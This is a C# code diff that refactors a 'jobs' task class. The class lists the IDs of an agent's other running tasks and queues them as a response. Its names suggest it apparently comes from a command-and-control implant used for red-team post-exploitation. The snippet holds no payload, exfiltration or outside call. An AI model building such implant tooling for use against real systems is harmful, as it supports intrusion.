@@ -22,28 +22,26 @@ namespace Tasks
         public jobs(IAgent agent, Task data) : base(agent, data)
         {
         }
-
-        public override ST.Task CreateTasking()
+        
+        public override void Start()
         {
-            return new ST.Task(() =>
+            string[] jids = _agent.GetTaskManager().GetExecutingTaskIds();
+            string fmtArr = "[";
+            List<string> realJids = new List<string>();
+            foreach (string j in jids)
             {
-                string[] jids = _agent.GetTaskManager().GetExecutingTaskIds();
-                string fmtArr = "[";
-                List<string> realJids = new List<string>();
-                foreach(string j in jids)
+                if (j != _data.ID)
                 {
-                    if (j != _data.ID)
-                    {
-                        realJids.Add(j);
-                    }
+                    realJids.Add(j);
                 }
-                TaskResponse resp = CreateTaskResponse("", true, "completed");
-                resp.ProcessResponse = new ApolloInterop.Structs.ApolloStructs.ProcessResponse
-                {
-                    Jobs = realJids.ToArray()
-                };
-                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
-            }, _cancellationToken.Token);
+            }
+
+            TaskResponse resp = CreateTaskResponse("", true, "completed");
+            resp.ProcessResponse = new ApolloInterop.Structs.ApolloStructs.ProcessResponse
+            {
+                Jobs = realJids.ToArray()
+            };
+            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
         }
     }
 }
